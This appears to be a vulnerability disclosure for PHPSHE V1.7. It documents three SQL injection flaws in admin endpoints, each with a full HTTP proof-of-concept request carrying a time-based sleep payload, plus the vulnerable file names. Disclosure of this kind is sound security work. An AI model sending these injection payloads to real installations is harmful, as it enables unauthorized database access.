# SQL1

PHPSHE V1.7 is vulnerable to SQL injection vulnerabilities. Attackers can inject sql statement via the cashout_id[] parameter to the server.

Poc:
```
POST /phpshe/admin.php?mod=cashout&act=success HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost/phpshe/admin.php?mod=cashout&state=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Cookie: PHPSESSID=0a97c3f86f5b63a3e74ffcdf1c70b59c
Connection: close
Upgrade-Insecure-Requests: 1

cashout_id%5B%5D=1')+and+IF(1=1,sleep(2),1)+and+('1'='1

```
vulnerability verification:
![](https://github.com/lemon666/image/blob/master/1.png)
![](https://github.com/lemon666/image/blob/master/2.png)
Using sqlmap：
![](https://github.com/lemon666/image/blob/master/3.png)
the lines of code where the vulnerability exist：
module/admin/cashout.php
![](https://github.com/lemon666/image/blob/master/4.png

# SQL2

PHPSHE V1.7 is vulnerable to SQL injection vulnerabilities. Attackers can inject sql statement via the menu_id[] parameter to the server.

Poc:
```
POST /phpshe/admin.php?mod=menu&act=del&token=1dc02be6d9710d51e89a116af232dced HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost/phpshe/admin.php?mod=menu
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Cookie: PHPSESSID=0a97c3f86f5b63a3e74ffcdf1c70b59c
Connection: close
Upgrade-Insecure-Requests: 1

menu_order%5B1%5D=1&menu_order%5B2%5D=2&menu_order%5B3%5D=3&menu_order%5B4%5D=4&menu_id%5B%5D=6'+and+IF(1=1,sleep(2),1)+and+'1'='1&menu_order%5B6%5D=6
```
vulnerability verification:
![](https://github.com/lemon666/image/blob/master/5.png)
the lines of code where the vulnerability exist：
module/admin/menu.php
![](https://github.com/lemon666/image/blob/master/6.png)

# SQL3

PHPSHE V1.7 is vulnerable to SQL injection vulnerabilities. Attackers can inject sql statement via the ad_id[] parameter to the server.

Poc:
```
POST /phpshe/admin.php?mod=ad&act=del&token=1dc02be6d9710d51e89a116af232dced HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost/phpshe/admin.php?mod=ad
Content-Type: application/x-www-form-urlencoded
Content-Length: 90
Cookie: PHPSESSID=0a97c3f86f5b63a3e74ffcdf1c70b59c
Connection: close
Upgrade-Insecure-Requests: 1

ad_id%5B%5D=17'+and+IF(1=1,sleep(2),1)+and+'1'='1&ad_order%5B17%5D=0&ad_order%5B16%5D=0&ad_order%5B12%5D=0&ad_order%5B18%5D=3
```
vulnerability verification:
![](https://github.com/lemon666/image/blob/master/7.png)
the lines of code where the vulnerability exist：
module/admin/ad.php
![](https://github.com/lemon666/image/blob/master/8.png)

